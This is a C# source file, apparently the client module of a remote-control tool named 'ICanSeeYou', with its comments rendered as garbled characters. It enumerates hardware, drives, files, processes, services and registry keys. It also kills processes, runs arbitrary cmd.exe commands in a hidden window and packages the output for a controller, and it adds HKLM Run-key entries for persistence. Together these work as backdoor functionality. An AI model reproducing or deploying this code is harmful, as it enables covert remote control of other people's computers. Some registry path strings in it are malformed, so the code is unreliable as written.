using System;
using System.Collections.Generic;
using System.Text;
using Microsoft.Win32;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using System.ServiceProcess;
namespace ICanSeeYou.Windows
{


    //���ȶ���һ��ȫ�֣����ߵ�ַ�����߶˿ڵ�
   public  class BD
    {
        public static String LocalDisk_List = "";                     //�����̷������ʼ������ͷ 
        public static String Online_Order = "";                     //���������ʼ������ͷ�� 
        public static String Folder_List = "";                  //�о����ļ��������ʼ������ͷ 
        public static String File_List = "";                    //�о��ļ������ʼ������ͷ 
        public static String Process_List = "";                 //�о��ļ������ʼ������ͷ 
        public static String RegName_List = "";            //�о�ע��������������ʼ������ͷ 
        public static String RegNameValues_List = "";      //�о�ע�������ֵ�����ʼ������ͷ 
        public static String CMD_List = "";                  //����DOS����ִ�к�Ľ�� 
        public static String Service_List = "";                 //����ϵͳ�����б� 
        public static Process CMD = new Process();                                 //����ִ��DOS���� 
        public static bool _IsStop_Catching_Desktop = false;                       //�˱�ʶΪ�����ж��Ƿ�ֹͣ������Ļ�Ļ�ȡ 
      

        /// <summary> 
        /// �˷���ͨ��Windows WMI ���� 
        /// ���м����Ӳ�������Ϣ���ռ� 
        /// </summary> 
        public static string  Get_ComputerInfo()
        {
            //��ѯ������� 
            Online_Order += System.Environment.NewLine;
            Online_Order += WMI_Searcher("SELECT * FROM Win32_ComputerSystem", "Caption") + System .Environment .NewLine ;
            //��ѯ����ϵͳ 
            Online_Order += WMI_Searcher("SELECT * FROM Win32_OperatingSystem", "Caption") + System .Environment .NewLine ;
            //��ѯCPU 
            Online_Order += WMI_Searcher("SELECT * FROM Win32_Processor", "Caption") + System .Environment .NewLine ;
            //��ѯ�ڴ����� - ��λ: MB 
            Online_Order += (int.Parse(WMI_Searcher("SELECT * FROM Win32_OperatingSystem", "TotalVisibleMemorySize")) / 1024) + " MB"+System .Environment .NewLine ;
            return Online_Order;
        }


        #region WMI ������ؼ���չ

        /// <summary> 
        /// �˷�������ָ�����ͨ��WMI��ѯ�û�ָ������ 
        /// ���ҷ��� 
        /// </summary> 
        /// <param name="QueryString"></param> 
        /// <param name="Item_Name"></param> 
        /// <returns></returns> 
        public static String WMI_Searcher(String QueryString, String Item_Name)
        {
            String Result = "";
            ManagementObjectSearcher MOS = new ManagementObjectSearcher(QueryString);
            ManagementObjectCollection MOC = MOS.Get();
            foreach (ManagementObject MOB in MOC)
            {
                Result = MOB[Item_Name].ToString();
                break;
            }
            MOC.Dispose();
            MOS.Dispose();
            return Result;
        }
        /// <summary>
        /// ����
        /// </summary>
        /// <param name="QueryString"></param>
        /// <returns></returns>
        public static String WMI_Searcher(String  QueryString)
        {
            string Result = "";
            ManagementObjectSearcher MOS = new ManagementObjectSearcher(QueryString);
            ManagementObjectCollection MOC = MOS.Get();
            foreach (ManagementObject MOB in MOC)
            {
                foreach (PropertyData prop in MOB.Properties)
                {
                    Result += prop.Name + ":";
                    Result += MOB[prop.Name].ToString() + ",";
                }
                Result += "|";
            }
            MOC.Dispose();
            MOS.Dispose();
            return Result;
        }
        
        #endregion

  

        #region ö��Ӳ�� 

        /// <summary> 
        /// �˷�������Windows WMI 
        /// �оٵ�ǰ���������̷� 
        /// </summary> 
        public static string  Get_LocalDisk()
        {
            LocalDisk_List = "$GetDir||";
            ManagementObjectSearcher MOS = new ManagementObjectSearcher("SELECT * FROM Win32_LogicalDisk");
            ManagementObjectCollection MOC = MOS.Get();
            foreach (ManagementObject MOB in MOC)
            {
                LocalDisk_List += MOB["Description"].ToString() + "#" + MOB["Caption"].ToString() + ",";
            }
            MOC.Dispose();
            MOS.Dispose();
            return LocalDisk_List;
           
        }

        #endregion

        #region �ļ��� - �ļ�ö�ٲ���

        /// <summary> 
        /// �˷������ڸ���ָ���̷��о����ļ��� 
        /// </summary> 
        /// <param name="Path"></param> 
        public static string  Get_Foloder(String Path)
        {
            Folder_List = "$GetFolder||";
            //�õ�ָ���̷����������ļ��� 
            String[] Folder = Directory.GetDirectories(Path);
            for (int i = 0; i < Folder.Length; i++)
            {
                Folder_List += Folder[i] + ",";
            }
            return Folder_List;
            
        }

        /// <summary> 
        /// �˷������ڸ���ָ���̷��о��������ļ� 
        /// </summary> 
        /// <param name="Path"></param> 
        public static string  Get_File(String Path)
        {
            File_List = "$GetFile||";
            //�õ��ļ�Ŀ���ļ����ļ����� 
            String[] Result_List = Directory.GetFiles(Path);
            //ͨ����ֵõ�����ַ��� 
            for (int i = 0; i < Result_List.Length; i++)
            {
                File_List += Result_List[i] + ",";
            }

            return File_List;
        }

        #endregion

       

      

        #region ϵͳ������ز���

        /// <summary> 
        /// �˷��������оٵ�ǰϵͳ���н��� 
        /// ����ƴ�ӽ���ַ������͸����ض� 
        /// </summary> 
        public static string  Get_Process()
        {
            Process_List = "";
            Process[] process = Process.GetProcesses();
            for (int i = 0; i < process.Length; i++)
            {
                try
                {
                    if (process[i].ProcessName != "")
                    {
                        //ƴ���ַ��� 
                        Process_List += process[i].Id .ToString () + "," + process[i].ProcessName  + "," + process[i].Handle .ToString () + ","+process [i].MainModule .FileName +","+process[i].StartTime .ToString ()+"|";
                    }
                }
                catch (Exception ex)
                { };

            }
            return Process_List;
            
        }

        /// <summary> 
        /// �˷�������ָ���Ľ�����ɱ������ 
        /// ����������̳ɹ� �򷵻� $KillProcess||True 
        /// ���򷵻� $KillProcess||False 
        /// </summary> 
        /// <param name="Process_Name"></param> 
        public static bool   Kill_Process(String Process_Name)
        {
            bool isKilled = false;
            Process[] Process_Set = Process.GetProcesses();
            //�������н��̣��ҵ�ָ�����̺�ɱ�� 
            for (int i = 0; i < Process_Set.Length; i++)
            {
                try
                {
                    if (Process_Set[i].ProcessName == Process_Name)
                    {
                        //����ҵ���������ɱ���ý��� 
                        Process_Set[i].Kill();
                        //ɱ���ɹ��� ���ı��־λ������FORѭ�����ͻ�Ӧ���� 
                        isKilled = true;
                        break;
                    }
                }
                catch (Exception ex)
                { };
            }

            //�õ�������жϱ�־λ 
            if (isKilled)
            {
                return true;
            }
            else
            {
                return false ;
            }
        }

        #endregion

        #region ע���������

        /// <summary> 
        /// �˷������ڵõ���ǰϵͳע����Ŀ¼���ֲ��ҷ��� 
        /// </summary> 
        public static string  Get_RegRoot(String Key_Model, String Key_Path)
        {
            RegName_List = "";
            //�½�����ṹ���������յõ������������� 
            String[] Reg_Name_Set = Get_Register_Root_Names(Key_Model, Key_Path);
            for (int i = 0; i < Reg_Name_Set.Length; i++)
            {
                //ƴ�ӽ���ַ��� 
                RegName_List += Reg_Name_Set[i] + "|";
            }
            return RegName_List;
        }

        /// <summary> 
        /// �˷�������ָ����ע�����·�� 
        /// ���������µ������������� 
        /// ���ҷ����������ƽṹ�� 
        /// </summary> 
        /// <param name="Key_Model"></param> 
        /// <param name="Key_Path"></param> 
        /// <returns></returns> 
        public static String[] Get_Register_Root_Names(String Key_Model, String Key_Path)
        {
            //�½����飬���������������ּ��� 
            String[] Names = null;
            //����Ǽ�������ֵ 
            if (Key_Path == "")
            {
                //�жϼ�ֵ·�������ĸ��� 
                switch (Key_Model)
                {
                    //�����HKEY_CLASSES_ROOT����� 
                    case "HKEY_CLASSES_ROOT":
                        Names = Registry.ClassesRoot.GetSubKeyNames();
                        break;
                    //�����HKEY_CURRENT_CONFIG����� 
                    case "HKEY_CURRENT_CONFIG":
                        Names = Registry.CurrentConfig.GetSubKeyNames();
                        break;
                    //�����HKEY_CURRENT_USER����� 
                    case "HKEY_CURRENT_USER":
                        Names = Registry.CurrentUser.GetSubKeyNames();
                        break;
                    //�����HKEY_LOCAL_MACHINE����� 
                    case "HKEY_LOCAL_MACHINE":
                        Names = Registry.LocalMachine.GetSubKeyNames();
                        break;
                    //�����HKEY_USERS����� 
                    case "HKEY_USERS":
                        Names = Registry.Users.GetSubKeyNames();
                        break;
                }
            }
            //����Ǽ�������ֵ��������� 
            else
            {
                //�жϼ�ֵ·�������ĸ��� 
                switch (Key_Model)
                {
                    //�����HKEY_CLASSES_ROOT����� 
                    case "HKEY_CLASSES_ROOT":
                        Names = Registry.ClassesRoot.OpenSubKey(Key_Path).GetSubKeyNames();
                        break;
                    //�����HKEY_CURRENT_CONFIG����� 
                    case "HKEY_CURRENT_CONFIG":
                        Names = Registry.CurrentConfig.OpenSubKey(Key_Path).GetSubKeyNames();
                        break;
                    //�����HKEY_CURRENT_USER����� 
                    case "HKEY_CURRENT_USER":
                        Names = Registry.CurrentUser.OpenSubKey(Key_Path).GetSubKeyNames();
                        break;
                    //�����HKEY_LOCAL_MACHINE����� 
                    case "HKEY_LOCAL_MACHINE":
                        Names = Registry.LocalMachine.OpenSubKey(Key_Path).GetSubKeyNames();
                        break;
                    //�����HKEY_USERS����� 
                    case "HKEY_USERS":
                        Names = Registry.Users.OpenSubKey(Key_Path).GetSubKeyNames();
                        break;
                }
            }

            //����Ŀ¼������ 
            return Names;
        }
       
        /// <summary> 
        /// �˷�������ָ����ע�����·�� 
        /// ���������µ�����ֵ���� 
        /// ���ҷ����������ƽṹ�� ,��ʽΪ�ֶ���##�ֶ�ֵ
        /// </summary> 
        /// <param name="Key_Model"></param> 
        /// <param name="Key_Path"></param> 
        /// <returns></returns> 
        public static String[] Get_Register_Root_Values(String Key_Model, String Key_Path)
        {
            //�½����飬���������������ּ��� 
            String Result_List = "";
            //����Ǽ�������ֵ 
            if (Key_Path == "")
            {
                //�жϼ�ֵ·�������ĸ��� 
                switch (Key_Model)
                {
                    //�����HKEY_CLASSES_ROOT����� 
                    case "HKEY_CLASSES_ROOT":
                        using (RegistryKey RK = Registry.ClassesRoot)
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                            }
                        }
                        break;
                    //�����HKEY_CURRENT_CONFIG����� 
                    case "HKEY_CURRENT_CONFIG":
                        using (RegistryKey RK = Registry.CurrentConfig)
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                            }
                        }
                        break;
                    //�����HKEY_CURRENT_USER����� 
                    case "HKEY_CURRENT_USER":
                        using (RegistryKey RK = Registry.CurrentUser)
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                            }
                        }
                        break;
                    //�����HKEY_LOCAL_MACHINE����� 
                    case "HKEY_LOCAL_MACHINE":
                        using (RegistryKey RK = Registry.LocalMachine)
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                            }
                        }
                        break;
                    //�����HKEY_USERS����� 
                    case "HKEY_USERS":
                        using (RegistryKey RK = Registry.Users)
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                            }
                        }
                        break;
                }
            }
            //����Ǽ�������ֵ��������� 
            else
            {
                //�жϼ�ֵ·�������ĸ��� 
                switch (Key_Model)
                {
                    //�����HKEY_CLASSES_ROOT����� 
                    case "HKEY_CLASSES_ROOT":
                        using (RegistryKey RK = Registry.ClassesRoot.OpenSubKey(Key_Path))
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                            }
                        }
                        break;
                    //�����HKEY_CURRENT_CONFIG����� 
                    case "HKEY_CURRENT_CONFIG":
                        using (RegistryKey RK = Registry.CurrentConfig.OpenSubKey(Key_Path))
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                            }
                        }
                        break;
                    //�����HKEY_CURRENT_USER����� 
                    case "HKEY_CURRENT_USER":
                        using (RegistryKey RK = Registry.CurrentUser.OpenSubKey(Key_Path))
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                            }
                        }
                        break;
                    //�����HKEY_LOCAL_MACHINE����� 
                    case "HKEY_LOCAL_MACHINE":
                        using (RegistryKey RK = Registry.LocalMachine.OpenSubKey(Key_Path))
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                            }
                        }
                        break;
                    //�����HKEY_USERS����� 
                    case "HKEY_USERS":
                        using (RegistryKey RK = Registry.Users.OpenSubKey(Key_Path))
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                            }
                        }
                        break;
                }
            }

            //����Ŀ¼������ 
            return Result_List.Split('|');
        }

        #endregion

        #region ϵͳDOS��ز���

        /// <summary> 
        /// �˷������ڼ����DOS 
        /// ���Ȳ����Ƿ����DOS�Ŀ�ִ���ļ� 
        /// ����������򷵻ش�����Ϣ 
        /// �����򷵻�DOS��ӭ��ʼ����Ϣ 
        /// </summary> 
        public static bool   ActiveDos()
        {
            //����������ļ� 
            if (!File.Exists(System.Environment.CurrentDirectory+"\\cmd.exe"))
            {
                return false;
            }
            //������� 
            else
            {
                return true;
               
            }
        }

        /// <summary> 
        /// �˷������ڻ��ִ�������Ľ�� 
        /// �����͸����ض� 
        /// </summary> 
        /// <param name="Order"></param> 
        public static string  Execute_Command(String Order)
        {
            return  "$ExecuteCommand||["+Order +"]"+System.Environment .NewLine +"-------------------------Start-------------------------"+System .Environment .NewLine  + Get_Message_Command("/c " + Order)+System .Environment .NewLine +"--------------------------End--------------------------"+ System.Environment .NewLine ;
           
        }


        /// <summary> 
        /// �˷������ڽ�ָ��DOS����ִ�к󷵻ؽ�� 
        /// </summary> 
        /// <param name="Command"></param> 
        /// <returns></returns> 
        public static String Get_Message_Command(String Command)
        {
            CMD.StartInfo.FileName = "cmd.exe";
            CMD.StartInfo.Arguments = Command;
            CMD.StartInfo.RedirectStandardError = true;
            CMD.StartInfo.RedirectStandardOutput = true;
            CMD.StartInfo.UseShellExecute = false;
            CMD.StartInfo.CreateNoWindow = true;
            CMD.Start();
            String Message_Line = "";
            String Result = "";
            using (StreamReader Reader = CMD.StandardOutput)
            {
                //ѭ����ȡ��� 
                while ((Message_Line = Reader.ReadLine()) != null)
                {
                    Result += Message_Line + "\n";
                }
            }
            return Result;

        }

        #endregion

        #region ϵͳ������ز���

        /// <summary> 
        /// �˷������ڽ��õ�������ϵͳ�����б� 
        /// ���͵����ض� 
        /// </summary> 
        public static string  GetService()
        {
            return   Service_List + WMI_Searcher ("SELECT Name,DisplayName,Description,State,StartMode,Started,PathName,ProcessId FROM Win32_Service");
           
        }
        public static bool StopService(string servicename)
        {
            try
            {
                using (ServiceController control = new ServiceController(servicename))
                {
                    if (control.Status == System.ServiceProcess.ServiceControllerStatus.Running) control.Stop();
                    control.Refresh();
                }
                return true;
            }
            catch
            { return false; }
        }
        public static bool StartService(string servicename)
        {
            try
            {
                using (ServiceController control = new ServiceController(servicename))
                {
                    if (control.Status == System.ServiceProcess.ServiceControllerStatus.Stopped ) control.Start();
                    control.Refresh();
                }
                return true;
            }
            catch
            { return false; }
        }
        /// <summary>
        /// ���÷����������ͣ�2�Զ���3�ֶ���4����
        /// </summary>
        /// <param name="servicename"></param>
        /// <param name="i">2�Զ���3�ֶ���4����</param>
        /// <returns></returns>
        public static bool ChangeStateService(string servicename, int i)
        {
            try
            {
                string keyPath = @"SYSTEM\CurrentControlSet\Services\" + servicename;
                RegistryKey key = Registry.LocalMachine.OpenSubKey(keyPath, true);
                int StartType = -1;
                if (Int32.TryParse(key.GetValue("Start").ToString(), out StartType))
                {
                    key.SetValue("Start", i);

                }
                return true;
            }
            catch { return false; }
        }
        /// <summary> 
        /// ���������� 
        /// </summary> 
        /// <param name=\"Started\">�Ƿ�����</param> 
        /// <param name=\"name\">����ֵ������</param> 
        /// <param name=\"path\">���������·��</param> 
        public static void RunWhenStart(bool Started, string name, string path)
        {
            RegistryKey HKLM = Registry.LocalMachine;
            RegistryKey Run = HKLM.CreateSubKey(@"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"); 
          if (Started == true)
            {
                try
                {
                    Run.SetValue(name, path);
                    HKLM.Close();
                }
                catch 
                {
                   
                }
            }
            else
            {
                try
                {
                    Run.DeleteValue(name);
                    HKLM.Close();
                }
                catch (Exception)
                {
                    // 
                }
            }
        }
        public static string StartupInfoList()
        {
            string msg = "";
            string [] keys = BD.Get_Register_Root_Values("HKEY_LOCAL_MACHINE", @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\");
            foreach (string key in keys) msg += key + "|";
            return msg;

        }
        #endregion

    }
}
